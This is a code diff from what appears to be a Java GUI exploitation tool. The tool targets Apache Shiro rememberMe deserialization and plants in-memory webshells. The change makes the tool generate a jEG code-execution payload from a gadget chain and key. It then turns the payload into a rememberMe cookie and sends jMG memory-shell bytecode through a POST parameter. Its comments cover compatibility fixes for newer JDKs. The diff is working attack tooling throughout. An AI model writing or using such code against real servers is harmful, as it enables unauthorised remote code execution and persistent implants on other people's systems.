@@ -1957,14 +1957,22 @@ public class MainController {
         String result;
         if (this.lastMemshellExploitSource != null && "jMG".equalsIgnoreCase(this.lastMemshellExploitSource.trim())) {
             this.memshellGeneratorOutput.appendText("[发送] jEG MODEL_CODE + jMG 注入\n");
-            // 直接用已验证成功的 attackRememberMe cookie（MODEL_CMD），POST body 带 jMG 字节码
-            String cookieLine = AttackService.attackRememberMe;
-            if (cookieLine == null || cookieLine.trim().isEmpty()) {
-                this.memshellGeneratorOutput.appendText("[发送结果] 无可用 rememberMe cookie，请先检测利用链\n");
-                result = null;
+            // 用 SERVER_UNKNOWN（DFSCodeExecTpl）兼容 JDK 11+，避免 TomcatCodeExecTpl static 块无 try-catch 的问题
+            String paramName = "user";
+            EchoGenerateResult jegResult = this.attackService.generateEchoWithThirdParty(
+                    "jEG", "SERVER_UNKNOWN", "MODEL_CODE", "FORMAT_BASE64",
+                    AttackService.gadget, null, key.trim(), "", paramName);
+            if (jegResult.isSuccess() && jegResult.getPayload() != null) {
+                String cookieLine = AttackService.resolveRememberMeCookieLine(jegResult.getPayload(), jegResult.getRequestHeaderName());
+                if (cookieLine != null) {
+                    result = this.attackService.sendJmgViaJegCode(cookieLine, paramName, this.lastMemshellExploitPayload, this.memshellGeneratorOutput);
+                } else {
+                    this.memshellGeneratorOutput.appendText("[发送结果] jEG payload 无法转为 rememberMe Cookie\n");
+                    result = null;
+                }
             } else {
-                String paramName = "user";
-                result = this.attackService.sendJmgViaJegCode(cookieLine, paramName, this.lastMemshellExploitPayload, this.memshellGeneratorOutput);
+                this.memshellGeneratorOutput.appendText("[发送结果] jEG MODEL_CODE 生成失败: " + (jegResult.getMessage() != null ? jegResult.getMessage() : "未知错误") + "\n");
+                result = null;
             }
         } else {
             this.memshellGeneratorOutput.appendText("[发送] InjectMemTool rememberMe Cookie + POST user=生成载荷 Base64\n");
